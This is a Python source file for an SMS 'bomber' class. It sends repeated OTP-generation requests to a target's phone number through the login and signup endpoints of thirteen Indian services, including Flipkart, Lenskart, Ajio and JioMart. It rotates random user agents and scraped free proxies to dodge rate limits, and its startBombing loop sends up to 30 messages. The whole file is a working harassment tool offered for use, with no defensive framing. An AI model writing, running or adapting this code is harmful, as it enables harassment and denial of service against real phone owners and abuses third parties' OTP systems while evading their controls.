import json
import random
import requests
import time
import os
import logging

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Bomber:

    def __init__(self, user_mobile, number_of_messege):
        self.user_mobile = user_mobile
        self.number_of_messege = number_of_messege
        self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"
        self.session = requests.Session()  # Session reuse for performance

    def getUserAgent(self):
        try:
            # Multiple paths try karo (Vercel ke liye)
            possible_paths = [
                'useragent.json',
                '/tmp/useragent.json',
                os.path.join(os.path.dirname(__file__), 'useragent.json')
            ]
            
            for path in possible_paths:
                try:
                    with open(path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        user_agent_list = data["user_agent"]
                        if user_agent_list:
                            return random.choice(user_agent_list)
                except:
                    continue
                    
        except Exception as e:
            logger.error(f"UserAgent error: {e}")
        
        # Default user agent agar file na mile
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    def _checkinternet(self):
        try:
            self.session.get("https://www.google.com", timeout=5)
            return True
        except Exception as e:
            logger.error(f"Internet check failed: {e}")
            return False

    def getproxy(self):
        try:
            proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
            proxy_request = self.session.get(proxy_scrape_url, timeout=10)
            proxylist = proxy_request.text.split()
            if proxylist:
                return 'https://' + random.choice(proxylist)
        except Exception as e:
            logger.error(f"Proxy error: {e}")
            return None
        return None

    def flipkart(self):
        url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
        user_agent = self.getUserAgent()
        flipkart_header = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": self.acceptlanguage,
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "DNT": "1",        
            "Host": "rome.api.flipkart.com",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": user_agent,
            "X-user-agent": user_agent + " FKUA/website/42/website/Desktop"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                json={"loginId": "+91" + self.user_mobile[-10:]},  # Sirf last 10 digits
                headers=flipkart_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Flipkart error: {e}")
            return False

    def confirmtkt(self):
        url = "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=" + self.user_mobile[-10:] + "&newOtp=true"
        confirmtkt_header = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": self.acceptlanguage,
            "Connection": "keep-alive",
            "DNT": "1",
            "Host": "securedapi.confirmtkt.com",
            "Origin": "https://www.confirmtkt.com",
            "Referer": "https://www.confirmtkt.com/rbooking-d/trips",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": self.getUserAgent()
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.get(url, headers=confirmtkt_header, proxies=proxies, timeout=5)
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Confirmtkt error: {e}")
            return False

    def lenskart(self):
        url = "https://api.lenskart.com/v2/customers/sendOtp"
        lenskat_header = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "content-type": "application/json;charset=UTF-8",
            "dnt": "1",
            "origin": "https://www.lenskart.com",
            "referer": "https://www.lenskart.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": self.getUserAgent(),
            "x-api-client": "desktop",
            "x-b3-traceid": "991589389250988",
            "x-session-token": "85d09926-3a73-4dbe-9f30-86b9f29f4a67"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                json={"telephone": self.user_mobile[-10:]},
                headers=lenskat_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Lenskart error: {e}")
            return False

    def justdial(self):
        url = "https://www.justdial.com/functions/whatsappverification.php"
        justdial_header = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.justdial.com",
            "referer": "https://www.justdial.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest",
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            r = self.session.post(
                url, 
                data="mob="+ self.user_mobile[-10:] +"&vcode=&rsend=0&name=deV",
                headers=justdial_header,
                proxies=proxies,
                timeout=5
            )
            return r.status_code == 200
        except Exception as e:
            logger.debug(f"Justdial error: {e}")
            return False

    def indialends(self):
        url = "https://indialends.com/internal/a/otp.ashx"
        indialends_header = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded",
            "dnt": "1",
            "Host": "indialends.com",
            "origin": "https://www.indialends.com",
            "referer": "https://www.indialends.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest",
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            r = self.session.post(
                url, 
                data="log_mode=1&ctrl="+ self.user_mobile[-10:],
                headers=indialends_header,
                proxies=proxies,
                timeout=5
            )
            return r.status_code == 200
        except Exception as e:
            logger.debug(f"Indialends error: {e}")
            return False

    def apolopharmacy(self):
        url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
        apolopharmacy_header = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "origin": "https://www.apollopharmacy.in",
            "referer": "https://www.apollopharmacy.in/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest",
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                data="mobile=" + self.user_mobile[-10:],
                headers=apolopharmacy_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Apollopharmacy error: {e}")
            return False

    def magicbrick(self):
        url = "https://accounts.magicbricks.com/userauth/api/validate-mobile"
        magicbrike_header = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "origin": "https://accounts.magicbricks.com",
            "referer": "https://accounts.magicbricks.com/userauth/login",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                data="ubimobile="+ self.user_mobile[-10:],
                headers=magicbrike_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Magicbrick error: {e}")
            return False

    def ajio(self):
        url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
        ajio_header = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-type": "application/json",
            "Host": "login.web.ajio.com",
            "dnt": "1",
            "origin": "https://www.ajio.com",
            "referer": "https://www.ajio.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": self.getUserAgent()
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                json={"mobileNumber": self.user_mobile[-10:]},
                headers=ajio_header,
                proxies=proxies,
                timeout=5
            )
            return request.json().get('success', False)
        except Exception as e:
            logger.debug(f"Ajio error: {e}")
            return False

    def mylescars(self):
        url = "https://www.mylescars.com/usermanagements/chkContact"
        myle_header = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "origin": "https://www.mylescars.com",
            "referer": "https://www.mylescars.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                data="contactNo="+ self.user_mobile[-10:],
                headers=myle_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Mylescars error: {e}")
            return False

    def unacademy(self):
        url = "https://unacademy.com/api/v1/user/get_app_link/"
        unac_header = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-type": "application/json",
            "dnt": "1",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent()
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                json={"phone": self.user_mobile[-10:]},
                headers=unac_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Unacademy error: {e}")
            return False

    def snapdeal(self):
        url = "https://www.snapdeal.com/sendOTP"
        snapdeal_head = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "DNT": "1",
            "Host": "www.snapdeal.com",
            "origin": "https://www.snapdeal.com",
            "referer": "https://www.snapdeal.com/iframeLogin",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "X-Requested-With": "XMLHttpRequest"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url, 
                data="emailId=&mobileNumber="+ self.user_mobile[-10:] + "&purpose=LOGIN_WITH_MOBILE_OTP",
                headers=snapdeal_head,
                proxies=proxies,
                timeout=5
            )
            return request.json().get('status') != "fail"
        except Exception as e:
            logger.debug(f"Snapdeal error: {e}")
            return False

    def jiomart(self):
        url = "https://www.jiomart.com/mst/rest/v1/id/details/" + self.user_mobile[-10:]
        jiomart_header = {
            "accept": "application/json, text/plain,*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "dnt": "1",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "referer": "https://www.jiomart.com/customer/account/login"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.get(url, headers=jiomart_header, proxies=proxies, timeout=5)
            return request.status_code == 400
        except Exception as e:
            logger.debug(f"Jiomart error: {e}")
            return False

    def valueshoppe(self):
        url = "https://www.valueshoppe.co.in/index.php?route=account/signup/sendSms"
        valueshoppe_header = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "www.valueshoppe.co.in",
            "Origin": "https://www.valueshoppe.co.in",
            "Referer": "https://www.valueshoppe.co.in/seller-login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "User-Agent": self.getUserAgent(),
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest"
        }
        try:
            proxy = self.getproxy()
            proxies = {'https': proxy} if proxy else None
            request = self.session.post(
                url,
                headers=valueshoppe_header,
                proxies=proxies,
                timeout=5
            )
            return request.status_code == 200
        except Exception as e:
            logger.debug(f"Valueshoppe error: {e}")
            return False

    def startBombing(self):
        try:
            if not self._checkinternet():
                logger.error("No internet connection!")
                return False

            counter = 0
            max_msg = min(self.number_of_messege, 30)  # Vercel limit 30 messages
            
            logger.info(f"Starting bombing on {self.user_mobile} for {max_msg} messages")
            
            # Service list
            services = [
                self.flipkart, self.confirmtkt, self.lenskart, self.justdial,
                self.indialends, self.apolopharmacy, self.magicbrick, self.ajio,
                self.mylescars, self.unacademy, self.snapdeal, self.jiomart,
                self.valueshoppe
            ]
            
            while counter < max_msg:
                for service in services:
                    if counter >= max_msg:
                        break
                    try:
                        if service():
                            counter += 1
                            logger.info(f"✅ Sent: {counter}/{max_msg}")
                    except Exception as e:
                        logger.debug(f"Service error: {e}")
                        continue
                    time.sleep(0.3)  # Small delay between requests
            
            logger.info(f"✅ Bombing completed! Total sent: {counter}")
            return counter > 0
            
        except Exception as e:
            logger.error(f"Bombing error: {e}")
            return False
